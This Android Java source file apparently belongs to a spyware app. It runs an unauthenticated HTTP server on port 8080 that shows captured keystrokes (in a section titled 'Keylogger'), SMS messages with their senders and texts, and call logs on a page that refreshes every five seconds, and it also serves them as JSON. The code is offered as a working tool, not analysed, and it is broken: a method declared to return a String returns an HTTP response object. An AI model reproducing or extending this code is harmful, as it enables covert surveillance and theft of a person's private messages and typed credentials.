package com.devicemonitor;

import android.content.Context;
import android.content.SharedPreferences;
import fi.iki.elonen.NanoHTTPD;
import org.json.JSONArray;
import org.json.JSONObject;

public class LogServer extends NanoHTTPD {

    private final Context context;

    public LogServer(Context context) throws Exception {
        super(8080);
        this.context = context;
    }

    @Override
    public Response serve(IHTTPSession session) {
        String uri = session.getUri();
        switch (uri) {
            case "/":
                return newFixedLengthResponse(Response.Status.OK, "text/html", getMainPage());
            case "/keys":
                return newFixedLengthResponse(Response.Status.OK, "application/json", getKeysJson());
            case "/sms":
                return newFixedLengthResponse(Response.Status.OK, "application/json", getSmsJson());
            case "/calls":
                return newFixedLengthResponse(Response.Status.OK, "application/json", getCallsJson());
            default:
                return newFixedLengthResponse(Response.Status.NOT_FOUND, "text/plain", "Not Found");
        }
    }

    private String getMainPage() {
        String keys = getKeysJson();
        String sms = getSmsJson();
        String calls = getCallsJson();

        String keysHtml;
        try {
            JSONArray arr = new JSONArray(keys);
            StringBuilder sb = new StringBuilder();
            if (arr.length() == 0) {
                sb.append("<p style='color:#666'>No keystrokes captured yet.</p>");
            } else {
                for (int i = 0; i < arr.length(); i++) {
                    JSONObject obj = arr.getJSONObject(i);
                    sb.append("<div class='log-entry'>");
                    sb.append("<span class='timestamp'>").append(escapeHtml(obj.optString("timestamp", ""))).append("</span> ");
                    sb.append("<span>").append(escapeHtml(obj.optString("key", ""))).append("</span>");
                    sb.append("<span class='badge'>").append(escapeHtml(obj.optString("packageName", ""))).append("</span>");
                    sb.append("</div>");
                }
            }
            keysHtml = sb.toString();
        } catch (Exception e) {
            keysHtml = "<p style='color:#666'>No keystrokes captured yet.</p>";
        }

        String smsHtml;
        try {
            JSONArray arr = new JSONArray(sms);
            StringBuilder sb = new StringBuilder();
            if (arr.length() == 0) {
                sb.append("<p style='color:#666'>No SMS captured yet.</p>");
            } else {
                for (int i = 0; i < arr.length(); i++) {
                    JSONObject obj = arr.getJSONObject(i);
                    sb.append("<div class='log-entry'>");
                    sb.append("<span class='timestamp'>").append(escapeHtml(obj.optString("date", ""))).append("</span> ");
                    sb.append("<b>").append(escapeHtml(obj.optString("address", ""))).append("</b>: ");
                    sb.append(escapeHtml(obj.optString("body", "")));
                    sb.append("</div>");
                }
            }
            smsHtml = sb.toString();
        } catch (Exception e) {
            smsHtml = "<p style='color:#666'>No SMS captured yet.</p>";
        }

        String callsHtml;
        try {
            JSONArray arr = new JSONArray(calls);
            StringBuilder sb = new StringBuilder();
            if (arr.length() == 0) {
                sb.append("<p style='color:#666'>No calls captured yet.</p>");
            } else {
                for (int i = 0; i < arr.length(); i++) {
                    JSONObject obj = arr.getJSONObject(i);
                    sb.append("<div class='log-entry'>");
                    sb.append("<span class='timestamp'>").append(escapeHtml(obj.optString("date", ""))).append("</span> ");
                    sb.append("<span>").append(escapeHtml(obj.optString("type", ""))).append("</span> ");
                    sb.append("<b>").append(escapeHtml(obj.optString("number", ""))).append("</b>");
                    sb.append("</div>");
                }
            }
            callsHtml = sb.toString();
        } catch (Exception e) {
            callsHtml = "<p style='color:#666'>No calls captured yet.</p>";
        }

        String html = "<!DOCTYPE html>\n" +
        "<html>\n" +
        "<head>\n" +
        "    <title>Device Monitor</title>\n" +
        "    <meta charset=\"UTF-8\">\n" +
        "    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n" +
        "    <style>\n" +
        "        * { margin: 0; padding: 0; box-sizing: border-box; }\n" +
        "        body { font-family: monospace; background: #0a0a0a; color: #00ff41; padding: 20px; }\n" +
        "        h1 { color: #fff; border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 20px; }\n" +
        "        h2 { color: #0ff; margin: 20px 0 10px; }\n" +
        "        .section { background: #111; border: 1px solid #333; border-radius: 8px; padding: 15px; margin-bottom: 20px; }\n" +
        "        .log-entry { padding: 4px 0; border-bottom: 1px solid #222; font-size: 13px; }\n" +
        "        .timestamp { color: #888; }\n" +
        "        .badge { display: inline-block; background: #00ff41; color: #000; padding: 2px 8px; border-radius: 4px; font-size: 11px; margin-left: 8px; }\n" +
        "        .refresh-btn { background: #00ff41; color: #000; border: none; padding: 8px 20px; border-radius: 4px; cursor: pointer; font-weight: bold; margin: 10px 0; }\n" +
        "        .refresh-btn:hover { background: #00cc33; }\n" +
        "    </style>\n" +
        "</head>\n" +
        "<body>\n" +
        "    <h1>Device Monitor Live View</h1>\n" +
        "    <button class=\"refresh-btn\" onclick=\"location.reload()\">Refresh</button>\n" +
        "    <p style=\"margin:10px 0;color:#666;\">Auto-refresh every 5 seconds</p>\n" +
        "    <div class=\"section\">\n" +
        "        <h2>Keylogger</h2>\n" +
        "        <div id=\"keys\">" + keysHtml + "</div>\n" +
        "    </div>\n" +
        "    <div class=\"section\">\n" +
        "        <h2>SMS Messages</h2>\n" +
        "        <div id=\"sms\">" + smsHtml + "</div>\n" +
        "    </div>\n" +
        "    <div class=\"section\">\n" +
        "        <h2>Call Log</h2>\n" +
        "        <div id=\"calls\">" + callsHtml + "</div>\n" +
        "    </div>\n" +
        "    <script>\n" +
        "        setInterval(function() { location.reload(); }, 5000);\n" +
        "    </script>\n" +
        "</body>\n" +
        "</html>";

        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
    }

    private String getKeysJson() {
        SharedPreferences prefs = context.getSharedPreferences("keylog_prefs", Context.MODE_PRIVATE);
        return prefs.getString("key_log", "[]");
    }

    private String getSmsJson() {
        SharedPreferences prefs = context.getSharedPreferences("sms_prefs", Context.MODE_PRIVATE);
        return prefs.getString("sms_log", "[]");
    }

    private String getCallsJson() {
        SharedPreferences prefs = context.getSharedPreferences("call_prefs", Context.MODE_PRIVATE);
        return prefs.getString("call_log", "[]");
    }

    private String escapeHtml(String text) {
        if (text == null) return "";
        return text
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
            .replace("\"", "&quot;")
            .replace("'", "&#39;");
    }
}
                        
